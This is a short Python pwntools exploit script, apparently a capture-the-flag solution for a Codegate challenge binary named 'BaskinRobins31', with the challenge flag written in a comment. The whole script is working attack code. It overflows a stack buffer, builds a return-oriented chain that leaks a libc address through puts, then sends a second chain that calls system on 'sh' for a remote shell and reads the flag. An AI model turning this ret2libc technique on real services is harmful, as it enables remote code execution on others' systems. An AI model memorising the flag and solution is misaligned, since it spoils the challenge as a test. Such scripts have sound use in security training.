#!/usr/bin/env python
from pwn import *


# flag{The Korean name of "Puss in boots" is "My mom is an alien"}

host  , port = 'ch41l3ng3s.codegate.kr' , 3131
y = remote( host , port )


e = ELF('./BaskinRobins31')

context.arch = 'amd64'

main = 0x400a4b
pop_rdi = 0x400bc3
pppr = 0x40087a


p = flat(
    'Y' * 0xb0,
    0,
    pop_rdi,
    e.got['__libc_start_main'],
    e.plt['puts'],
    main
)


y.sendafter( '(1-3)' , p )

y.recvuntil(':( \n')
l = u64( y.recv(6).ljust( 8 , '\x00' ) ) - 0x20740
log.success( 'libc -> %s' % hex( l ) )

p = flat(
    'Y' * 0xb0,
    0,
    pppr,
    0,
    e.bss(),
    0x70,
    e.plt['read'],
    pop_rdi,
    e.bss(),
    l + 0x045390
)

y.sendafter( '(1-3)' , p )

sleep( 1 )

y.sendline( 'sh' )

sleep( 1 )

y.sendline( 'cat flag' )

y.interactive()